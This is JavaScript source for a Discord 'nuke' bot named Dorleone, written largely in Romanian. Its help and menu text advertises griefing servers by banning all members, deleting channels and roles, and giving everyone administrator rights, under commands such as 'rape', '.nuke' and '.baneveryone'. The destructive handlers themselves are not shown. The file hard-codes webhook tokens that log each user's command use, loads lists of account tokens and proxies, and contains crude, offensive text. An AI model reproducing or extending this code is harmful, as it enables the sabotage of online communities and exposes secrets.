const discordjs = require('discord.js');
const Discord = require('discord.js');
const fs = require('fs')
const tokens = fs.readFileSync('./variables/tokens.txt', 'utf-8').replace(/\r|\x22/gi, '').split('\n');
const proxies = fs.readFileSync('./variables/proxies.txt', 'utf-8').replace(/\r|\x22/gi, '').split('\n');
const cooldown = new Set();
const cdtime = 5;
const msg = 5;
const configjson = require('./config.json');
const helpEmbed = require('discord.js');
const footer = require('discord.js');
const { MessageEmbed, version: djsversion } = require('discord.js');
const client = new Discord.Client({ ws: { intents: new Discord.Intents(Discord.Intents.ALL) } });
const { red, green, blue, yellow, cyan, greenBright, redBright, grey, yellowBright, cyanBright, black, blueBright } = require('chalk');
const settings = require('./settings.json');
const token = settings.token;
const prefix = settings.prefix;
const founder = settings.founder;
const disableEveryone = settings.DisableEveryone;
const myID = settings.ID;
const db = require("quick.db")
const inlinereply = require('discord-reply');
var whitelistedservers = ["847915478483206194", "854086476953944124", "902640509472870450"]
var give_everyone_administrator = configjson.server.give_everyone_administrator

client.on("ready", async () => {

let matatactu = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Restart")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`The bot was reconnected to the host <a:emoji_158:885300085993394218>`);

const wrb = new Discord.WebhookClient("896420583363985409", "tLyEu-o7Id6agOn3LCizYm5OeCOFD4Ucv7uXTNN2In0Ixn2Tlth_AYgfG9VlXVQIcoU0");
    await wrb.send(matatactu)

  console.log(`
====================Dorleone========================
[\x1b[43m1\x1b[0m]\x1b[32m Ban All                \x1b[0m[\x1b[43m10\x1b[0m] \x1b[32mDefault Commands\x1b[0m
[\x1b[43m2\x1b[0m] \x1b[32mKick All               \x1b[0m[\x1b[43m11\x1b[0m] \x1b[41mBan Ids\x1b[0m
[\x1b[43m3\x1b[0m] \x1b[32mDelete Channels        \x1b[0m[\x1b[43m12\x1b[0m] \x1b[32mDefault Server\x1b[0m
[\x1b[43m4\x1b[0m] \x1b[32mDelete Roles           \x1b[0m[\x1b[43m13\x1b[0m] \x1b[32mList Members\x1b[0m
[\x1b[43m5\x1b[0m] \x1b[32mDelete Emotes          \x1b[0m[\x1b[43m14\x1b[0m] \x1b[32mList Roles\x1b[0m
[\x1b[43m6\x1b[0m] \x1b[32mMass Channels          \x1b[0m[\x1b[43m15\x1b[0m] \x1b[32mList Channels\x1b[0m
[\x1b[43m7\x1b[0m] \x1b[32mMass Roles             \x1b[0m[\x1b[43m16\x1b[0m] \x1b[32mList Servers\x1b[0m
[\x1b[43m8\x1b[0m] \x1b[41mUnban All\x1b[0m              \x1b[0m[\x1b[43m17\x1b[0m] \x1b[30mUnload\x1b[0m
[\x1b[43m9\x1b[0m] \x1b[32mAdmin Everyone         \x1b[0m[\x1b[43m18\x1b[0m] \x1b[30mClose\x1b[0m
\x1b[0m====================Dorleone========================`);
  
  const statusArray = ['https://mafia-dorleone.gq, WATCHING', 'Fasted ⚡, LISTENING', 'Better leave me alone, PLAYING', 'I make you die only 1 button, WATCHING'];
client.user.setPresence({ status: 'idle' });

    setInterval(() => {
      client.user.setPresence({ status: 'idle' });
      const random = statusArray[Math.floor(Math.random() * statusArray.length)].split(', ')
      const status = random[0];
      const mode = random[1];
      client.user.setActivity(status, { type: mode })

    }, 10000) //your time of changing status in miliseconds for example 1 second = 1000 ms
});

  console.log("Servers:")
    client.guilds.cache.forEach((guild) => {
        console.log(" csf cuaie >> " + guild.name + " - sklavi " + guild.memberCount)
    })

client.on("message", async message => {

  if (message.author.bot) return;

  if (message.content.startsWith('.commands')) {

        if (message.author.bot || message.channel.type === "dm") return;
        try {
            let fetched = await db.fetch(`prefix_${message.guild.id}`);
            if (fetched == null) {
            } else {
                prefix = fetched
            }
        } catch (e) {
            console.log(e)
    };

        if (cooldown.has(message.author.id)) {
      return message.lineReply(`<:emoji_18:874972112253763634> Please wait 5 seconds to use this command`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

let cmdmd = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) a folosit comanda \`.commands\``);

    const wrb = new Discord.WebhookClient("896426653515935804", "s9qT5hEiu5DGd_wOXQxzSF39GvrfY3b3pSOY4cNdX4jZoNtg16bZ7QhA3dwl7_6M0FWQ");
      await wrb.send(cmdmd)

    const helpEmbed = new Discord.MessageEmbed()
      .setColor('d72bff')
      .setThumbnail(`https://images-ext-2.discordapp.net/external/liX4rW0gAlWmXJB3rHNg875sx-oa5oH6T9Hjq9r8RDg/https/media.discordapp.net/attachments/885886443040407594/902623823747219517/pornoleone.gif`)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
      .setTitle(`<:emoji_41:874972124828278827> **__COMMANDS LIST__**`)
      .setDescription("")
      .addFields({
        name: '\`↷\` Comenzile Standard (4)',
        value: '<:sageataa:902591614176854087> rape, .deleteroles, .deletechannels, .baneveryone,',
      },
      {
        name: '\`↷\` Comenzile Premium (10)',
        value: '<:sageataa:902591614176854087> .kaboom, .nuke, .banv2, .spamchannels, .sn, .addchannel, .addcategory, .cn, .deleteem, .giverole',
      },
            {
        name: '\`↷\` Comenzile Info (9)',
        value: '<:sageataa:902591614176854087> .help, .ping, .invite, .premium, .prlist, .stats, .uptime, .programstatus, .website',
      },
      {
        name: '\`↷\` Developer Only (4)',
        value: '<:sageataa:902591614176854087> .add premium, .rmv premium, .restart, .guilds',
      },
                        {
        name: '\`↷\` Comenzile Soon (2)',
        value: '<:sageataa:902591614176854087> .custom, .disablecommunity',
      },
      )
       message.lineReply(helpEmbed).then(message => {     setTimeout(function() { message.edit(`<:emoji_18:874972112253763634> This command menu is expired! Try again by typing \`.commands\``) }, 20000)})
  }

  if (message.content.startsWith('.help')) 
  {

        if (message.author.bot || message.channel.type === "dm") return;
        try {
            let fetched = await db.fetch(`prefix_${message.guild.id}`);
            if (fetched == null) {
            } else {
                prefix = fetched
            }
        } catch (e) {
            console.log(e)
    };

    if (cooldown.has(message.author.id)) {
      return message.lineReply(`<:emoji_18:874972112253763634> Please wait 5 seconds to use this command`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

let cmdmd31 = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) a folosit comanda \`.help\``);

    const wrb = new Discord.WebhookClient("896426653515935804", "s9qT5hEiu5DGd_wOXQxzSF39GvrfY3b3pSOY4cNdX4jZoNtg16bZ7QhA3dwl7_6M0FWQ");
      await wrb.send(cmdmd31)

    const helpEmbed = new Discord.MessageEmbed()
      .setColor('d72bff')
      .setThumbnail(`https://images-ext-2.discordapp.net/external/liX4rW0gAlWmXJB3rHNg875sx-oa5oH6T9Hjq9r8RDg/https/media.discordapp.net/attachments/885886443040407594/902623823747219517/pornoleone.gif`)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
      .setTitle(`<:emoji_41:874972124828278827> __**HELP COMMAND**__`)
      .setImage("https://media.discordapp.net/attachments/901794966425186322/902868134468403200/pingiu_e_gay.gif")
      .setDescription("</>")
      .addFields({
        name: '<a:MODERATOR:902590203896688680> __**My Feautures**__',
        value: `> Cel mai tare bot din romania de nuke! Daca vrei sa dai un grief la un server acesta este botul perfect pentru tine.\n> <:emoji_28:874972111200989215> Ping: \`${Math.round(client.ws.ping)}ms\``,
      },
      {
        name: '<a:zlink:902590455240335421> __**Links**__',
        value: '>  <:sageataa:902591614176854087> [• My Website](http://mafia-dorleone.gq/cmd.html)\n>  <:sageataa:902591614176854087> [• Support Server](https://dsc.gg/dorleone)\n>  <:sageataa:902591614176854087> [• Invite Me](https://discord.com/api/oauth2/authorize?client_id=892442762224484413&permissions=2146958847&scope=bot)\n>  <:sageataa:902591614176854087> [• Premium Server](https://discord.gg/QhdUDfCemu)',
      },
            {
        name: '<a:abcc:902598548661624855> __**Premium CMDS**__',
        value: '> [• Premium Commands](https://mafia-dorleone.gq)',
      },
      {
        name: '<a:ONLINE:902590457064874054> __**Free CMDS**__',
        value: '> • rape \`&\` __Destroy the server__\n> • .deletechannels \`&\` __Delete all channels__\n> • .deleteroles \`&\` __Delete all roles__\n> • .baneveryone \`&\` __Banning all members__',
      },
      )
              message.lineReply(helpEmbed).then(message => {     setTimeout(function() { message.edit(`<:emoji_18:874972112253763634> This help menu is expired! Try again by typing \`.help\``) }, 20000)})
            
  }

        if (message.content.startsWith('.uptime')) {	

              if (message.author.bot || message.channel.type === "dm") return;
        try {
            let fetched = await db.fetch(`prefix_${message.guild.id}`);
            if (fetched == null) {
            } else {
                prefix = fetched
            }
        } catch (e) {
            console.log(e)
    };

    if (cooldown.has(message.author.id)) {
      return message.lineReply(`<:emoji_18:874972112253763634> Please wait 5 seconds to use this command`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);
		
let npp1 = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) a folosit comanda \`.uptime\``);


    const wrb = new Discord.WebhookClient("896426653515935804", "s9qT5hEiu5DGd_wOXQxzSF39GvrfY3b3pSOY4cNdX4jZoNtg16bZ7QhA3dwl7_6M0FWQ");
      await wrb.send(npp1)


		var errorvar;

				// Basic embed
				let totalSeconds = (client.uptime / 1000);
				let days = Math.floor(totalSeconds / 86400);
				totalSeconds %= 86400;
				let hours = Math.floor(totalSeconds / 3600);
				totalSeconds %= 3600;
				let minutes = Math.floor(totalSeconds / 60);
				let seconds = Math.floor(totalSeconds % 60);
			
			  var outputembed = new discordjs.MessageEmbed()
	    		.setColor('#d72bff')
	    		.setTitle(``)
          .setDescription(`<:emoji_41:874972124828278827> **__UPTIME COMMAND__**
          
          Uptime: \`${hours} hour(s), ${minutes} minute(s) and ${seconds} second(s)\``)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
			  
       message.lineReply(outputembed).then(message => {     setTimeout(function() { message.edit(`<:emoji_18:874972112253763634> This uptime menu is expired! Try again by typing \`.uptime\``) }, 10000)})
		
	}

//invite
  if (message.content.startsWith('.restart')) {

        if (message.author.bot || message.channel.type === "dm") return;
        try {
            let fetched = await db.fetch(`prefix_${message.guild.id}`);
            if (fetched == null) {
            } else {
                prefix = fetched
            }
        } catch (e) {
            console.log(e)
    };

    if (cooldown.has(message.author.id)) {
      return message.lineReply(`<:emoji_18:874972112253763634> Please wait 5 seconds to use this command`).then(m => m.delete({timeout: 1000}))
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

let afc1 = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) a folosit comanda \`.restart\``);

    const wrb = new Discord.WebhookClient("896426653515935804", "s9qT5hEiu5DGd_wOXQxzSF39GvrfY3b3pSOY4cNdX4jZoNtg16bZ7QhA3dwl7_6M0FWQ");
      await wrb.send(afc1)

            message.lineReply('<:emoji_18:874972112253763634> Hey! This command is Developer Only').then(m => m.delete({timeout: 5000}))
                                                         }

  if(message.content === ".programstatus"){

        if (message.author.bot || message.channel.type === "dm") return;
        try {
            let fetched = await db.fetch(`prefix_${message.guild.id}`);
            if (fetched == null) {
            } else {
                prefix = fetched
            }
        } catch (e) {
            console.log(e)
    };

        if (cooldown.has(message.author.id)) {
      return message.lineReply(`<:emoji_18:874972112253763634> Please wait 5 seconds to use this command`).then(m => {
        m.delete({ timeout: cdtime * 1000 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

    message.lineReply('Dorleone JavaScript status <:bnnnnn:902600438900224001>').then(async msg => {
      setTimeout(() => {
        msg.edit('░░░░░░░░░░ 0%');
      }, 1000);
      setTimeout(() => {
        msg.edit('▓▓░░░░░░░░ 20%');
      }, 1500);
      setTimeout(() => {
        msg.edit('▓▓▓▓░░░░░░ 40%');
      }, 2000);
      setTimeout(() => {
        msg.edit('▓▓▓▓▓▓░░░░ 60%');
      }, 2500);
      setTimeout(() => {
        msg.edit('▓▓▓▓▓▓▓▓░░ 80%');
      }, 3000);
      setTimeout(() => {
        msg.edit('▓▓▓▓▓▓▓▓▓▓ 100%');
      }, 3500);
      setTimeout(() => {
        msg.edit('Result..');
      }, 3500);
      setTimeout(() => {
        msg.edit(`<:emoji_20:874972116833947668> Dorleone 100% completed, programmed JavaScript`);
      }, 3500);
    });
    };

        if (message.content.startsWith('.stats')) {

    if (message.author.bot || message.channel.type === "dm") return;
        try {
            let fetched = await db.fetch(`prefix_${message.guild.id}`);
            if (fetched == null) {
            } else {
                prefix = fetched
            }
        } catch (e) {
            console.log(e)
    };

    if (cooldown.has(message.author.id)) {
      return message.lineReply(`<:emoji_18:874972112253763634> Please wait 5 seconds to use this command`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

let cue1 = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) a folosit comanda \`.stats\``);

    const wrb = new Discord.WebhookClient("896426653515935804", "s9qT5hEiu5DGd_wOXQxzSF39GvrfY3b3pSOY4cNdX4jZoNtg16bZ7QhA3dwl7_6M0FWQ");
      await wrb.send(cue1)

		const output = new discordjs.MessageEmbed()
 .setDescription("<:emoji_41:874972124828278827> **__STATS COMMAND__**")
	    .setColor('#d72bff')
	    .setTitle('')
	    .addField(`**Server Count**`, `${client.guilds.cache.size} server(s)`, false)
		.addField(`**Total Member Count**`, `${client.users.cache.size} member(s)`, false)
		.addField(`**Discord.JS version**`, `v${discordjs.version}`, false)
		.addField(`**For up-time information, type**`, `.uptime`, false)
		.addField(`**For latency / ping information, type**`, `.ping`, false)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()

       message.lineReply(output).then(message => {     setTimeout(function() { message.edit(`<:emoji_18:874972112253763634> This stats menu is expired! Try again by typing \`.stats\``) }, 10000)})
	}

if (message.content.startsWith('<@892442762224484413>')) { message.lineReply('Hey! my prefix is \`.\` For help type \`.help\`')
                                                         }
 
 if (message.content.startsWith('<@&892442762224484413>')) { message.lineReply('Hey! my prefix is \`.\` For help type \`.help\`')
                                                         }

if (message.content.startsWith('.custom')) { message.lineReply('Hey! this command is soon. Please type \`.help\` for commands')
                                                         }

 if (message.content.startsWith('.disablecommunity')) { message.lineReply('Hey! this command is soon. Please type \`.help\` for commands')
                                                         }                                                        

//invite
  if (message.content.startsWith('.invite')) {

    if (message.author.bot || message.channel.type === "dm") return;
        try {
            let fetched = await db.fetch(`prefix_${message.guild.id}`);
            if (fetched == null) {
            } else {
                prefix = fetched
            }
        } catch (e) {
            console.log(e)
    };

    if (cooldown.has(message.author.id)) {
      return message.lineReply(`<:emoji_18:874972112253763634> Please wait 5 seconds to use this command`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

let invez = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) a folosit comanda \`.invite\``);

    const wrb = new Discord.WebhookClient("896426653515935804", "s9qT5hEiu5DGd_wOXQxzSF39GvrfY3b3pSOY4cNdX4jZoNtg16bZ7QhA3dwl7_6M0FWQ");
      await wrb.send(invez)

    const helpEmbed = new Discord.MessageEmbed()
      .setTitle('<:emoji_41:874972124828278827> **__INVITE COMMAND__**')
      .setDescription(`

>  <:sageataa:902591614176854087> Invite link-ul este atasat aici [CLICK](https://discord.com/api/oauth2/authorize?client_id=892442762224484413&permissions=2146958847&scope=bot)

>  <:sageataa:902591614176854087> Botul are comanda principala "rape"

>  <:sageataa:902591614176854087> Invite Link de pe site [CLICK](https://mafia-dorleone.gq)`)
      .setImage(``)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
      .setColor('d72bff')
        message.lineReply(helpEmbed).then(message => {     setTimeout(function() { message.edit(`<:emoji_18:874972112253763634> This invite menu is expired! Try again by typing \`.invite\``) }, 10000)})
  }

//invite
  if (message.content.startsWith('.prlist')) {

        if (message.author.bot || message.channel.type === "dm") return;
        try {
            let fetched = await db.fetch(`prefix_${message.guild.id}`);
            if (fetched == null) {
            } else {
                prefix = fetched
            }
        } catch (e) {
            console.log(e)
    };

    if (cooldown.has(message.author.id)) {
      return message.lineReply(`<:emoji_18:874972112253763634> Please wait 5 seconds to use this command`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

let prlist = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) a folosit comanda \`.prlist\``);

    const wrb = new Discord.WebhookClient("896426653515935804", "s9qT5hEiu5DGd_wOXQxzSF39GvrfY3b3pSOY4cNdX4jZoNtg16bZ7QhA3dwl7_6M0FWQ");
      await wrb.send(prlist)

    const helpEmbed = new Discord.MessageEmbed()
      .setTitle('<:emoji_41:874972124828278827> **__INVITE PRLIST__**')
      .setDescription(`
> **Mafia Dorleone** premium users

\`↷\` <@773678406826328075>
\`↷\` <@788079098286571530>
\`↷\` <@833581037354221599>

>  Mafia Dorleone website [CLICK](https://mafia-dorleone.gq/)`)
      .setImage(``)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
      .setColor('d72bff')
        message.lineReply(helpEmbed).then(message => {     setTimeout(function() { message.edit(`<:emoji_18:874972112253763634> This prlist menu is expired! Try again by typing \`.prlist\``) }, 10000)})
  }

//pinggggggggggg
  if (message.content.startsWith('.ping')) {

        if (message.author.bot || message.channel.type === "dm") return;
        try {
            let fetched = await db.fetch(`prefix_${message.guild.id}`);
            if (fetched == null) {
            } else {
                prefix = fetched
            }
        } catch (e) {
            console.log(e)
    };

    if (cooldown.has(message.author.id)) {
      return message.lineReply(`<:emoji_18:874972112253763634> Please wait 5 seconds to use this command`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

let pengu1 = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) a folosit comanda \`.ping\``);

    const wrb = new Discord.WebhookClient("896426653515935804", "s9qT5hEiu5DGd_wOXQxzSF39GvrfY3b3pSOY4cNdX4jZoNtg16bZ7QhA3dwl7_6M0FWQ");
      await wrb.send(pengu1)

const helpEmbed = new Discord.MessageEmbed()
.setTitle(`<:emoji_41:874972124828278827> **__PING COMMAND__**`)
.setColor(`#d72bff`)
.setDescription(`
<:emoji_28:874972111200989215> **Bot Latency:** \`${Math.round(client.ws.ping)}ms\`
<:emoji_16:874972109556830248> **API Latency:** \`${Date.now() - message.createdTimestamp}ms\``)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
        message.lineReply(helpEmbed).then(message => {     setTimeout(function() { message.edit(`<:emoji_18:874972112253763634> This ping menu is expired! Try again by typing \`.ping\``) }, 10000)})
        }



//premiummmmmmmmm
  if (message.content.startsWith('.website')) {

        if (message.author.bot || message.channel.type === "dm") return;
        try {
            let fetched = await db.fetch(`prefix_${message.guild.id}`);
            if (fetched == null) {
            } else {
                prefix = fetched
            }
        } catch (e) {
            console.log(e)
    };

    if (cooldown.has(message.author.id)) {
      return message.lineReply(`<:emoji_18:874972112253763634> Please wait 5 seconds to use this command`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

const c1c1 = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) a folosit comanda \`.website\``);

    const wrb = new Discord.WebhookClient("896426653515935804", "s9qT5hEiu5DGd_wOXQxzSF39GvrfY3b3pSOY4cNdX4jZoNtg16bZ7QhA3dwl7_6M0FWQ");
      await wrb.send(c1c1)

const helpEmbed = new Discord.MessageEmbed()
      .setTitle('<:emoji_41:874972124828278827> **__DORLEONE WEBSITE__**')
      .setDescription(`
>  <a:4382_star_green:904477999565533274> Mafia Dorleone Website [Click Me](http://mafia-dorleone.gq/)`)
      .setImage(``)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
      .setColor('00001')
        message.lineReply(helpEmbed).then(message => {     setTimeout(function() { message.edit(`<:emoji_18:874972112253763634> This website menu is expired! Try again by typing \`.website\``) }, 10000)})
  }






//premiummmmmmmmm
  if (message.content.startsWith('.premium')) {

        if (message.author.bot || message.channel.type === "dm") return;
        try {
            let fetched = await db.fetch(`prefix_${message.guild.id}`);
            if (fetched == null) {
            } else {
                prefix = fetched
            }
        } catch (e) {
            console.log(e)
    };

    if (cooldown.has(message.author.id)) {
      return message.lineReply(`<:emoji_18:874972112253763634> Please wait 5 seconds to use this command`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

const premiume = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.gq', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) a folosit comanda \`.premium\``);

    const wrb = new Discord.WebhookClient("896426653515935804", "s9qT5hEiu5DGd_wOXQxzSF39GvrfY3b3pSOY4cNdX4jZoNtg16bZ7QhA3dwl7_6M0FWQ");
      await wrb.send(premiume)

const helpEmbed = new Discord.MessageEmbed()
      .setTitle('<:emoji_41:874972124828278827> **__PREMIUM COMMAND__**')
      .setDescription(`
>  <:sageataa:902591614176854087> Pentru a da claim la premium, dm Pingu

>  <:sageataa:902591614176854087> Daca esti curios ce face premium [CLICK](http://mafia-dorleone.gq/cmd.html)

>  <:sageataa:902591614176854087> Daca aveti premium la bot, cereti grad aici [CLICK](https://discord.gg/NYCgzkFCW6)`)
      .setImage(``)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
      .setColor('00001')
        message.lineReply(helpEmbed).then(message => {     setTimeout(function() { message.edit(`<:emoji_18:874972112253763634> This premium menu is expired! Try again by typing \`.premium\``) }, 10000)})
  }

if (message.content.startsWith(".rmv premium")) {

            message.lineReply('<:emoji_18:874972112253763634> Hey! This command is Developer Only').then(m => m.delete({timeout: 5000}))


        const embed = new MessageEmbed()
        .setTitle("<:bnnnnn:902600438900224001> **Mafia Dorleone | Speed x5 <:bnnnnn:902600438900224001>**")
        .setDescription(`<a:DND:902590455961776210> Ai ramas fara premium. Nu mai poti beneficia de comenzile speciale`)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
        .setColor("0d0d0d")
           let ownerID = "811681164464095263"
  if(message.author.id !== ownerID) return;

  let rmvpremium = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) a sters un membru de la lista de \`premium\``;

  const wrb = new Discord.WebhookClient("896426653515935804", "s9qT5hEiu5DGd_wOXQxzSF39GvrfY3b3pSOY4cNdX4jZoNtg16bZ7QhA3dwl7_6M0FWQ");
      await wrb.send(rmvpremium)

    const user = message.mentions.members.first() || message.guild.members.cache.get([0])
    db.fetch(`dev_${user.id}`);
    db.delete(`dev_${user.id}`, 1)
        const tactuEmbed = new Discord.MessageEmbed()
    .setColor('#00001')
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
    .setTitle('<:bnnnnn:902600438900224001> **Mafia Dorleone | Speed x5 <:bnnnnn:902600438900224001>**')
    .setDescription("<a:DND:902590455961776210> Acel user nu mai are premium\n<a:DND:902590455961776210> Acum, nu mai poate beneficia de comenzile speciale")
            message.lineReply(tactuEmbed);

  user.send(embed)

  }

  if (message.content.startsWith(".add premium")) {

            message.lineReply('<:emoji_18:874972112253763634> Hey! This command is Developer Only').then(m => m.delete({timeout: 5000}))


        const embed = new MessageEmbed()
        .setTitle("<:bnnnnn:902600438900224001> **Mafia Dorleone | Speed x5 <:bnnnnn:902600438900224001>**")
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
      .setColor("#0d0d0d")
      .setDescription(`<a:ONLINE:902590457064874054> Ai primit premium. Acum vei putea beneficia de comenzile speciale!
<a:ONLINE:902590457064874054> Pentru a vedea ce poate face premium [CLICK](http://mafia-dorleone.gq/cmd.html)`);
         let ownerID = "811681164464095263"
  if(message.author.id !== ownerID) return;
  let addpremium = `**${message.author.tag}** (` + "`" + message.author.id + "`" + `) a adaugat un membru la lista de \`premium\``;
  const wrb = new Discord.WebhookClient("896426653515935804", "s9qT5hEiu5DGd_wOXQxzSF39GvrfY3b3pSOY4cNdX4jZoNtg16bZ7QhA3dwl7_6M0FWQ");
    await wrb.send(addpremium)

    const user = message.mentions.members.first() || message.guild.members.cache.get([0])
    db.fetch(`dev_${user.id}`);
    db.set(`dev_${user.id}`, 1)
    const mataEmbed = new Discord.MessageEmbed()
    .setColor('#00001')
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
    .setTitle('<:bnnnnn:902600438900224001> **Mafia Dorleone | Speed x5 <:bnnnnn:902600438900224001>**')
.setDescription("<a:ONLINE:902590457064874054> Acel membru a primit premium\n<a:ONLINE:902590457064874054> Acum, poate beneficia de comenzile speciale")
        message.lineReply(mataEmbed);
    user.send(embed)

  }

//icon set
  if (message.content.startsWith('.sn')) {

        let Embed4 = new Discord.MessageEmbed()
        .setColor("#0d0d0d")
        .setTitle("Permission Reject")
        .setDescription(`<a:emoji_1581:885300167119630426> Nu ai permisiunea necesara`)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
         
      let user = message.mentions.members.first() || message.author;
      let vip5 = await db.fetch(`dev_${message.author.id}`)
    
         if(vip5 < 1) return message.channel.send(Embed4)

		if (whitelistedservers.includes(message.guild.id))
		{
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#00001')
                .setTitle("Permission Reject")
	    	.setDescription("<a:DND:902590455961776210> You don't have permission to use command in this server")
                        .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
             message.lineReply(whitelistembed);
			return;
		}
message.delete();
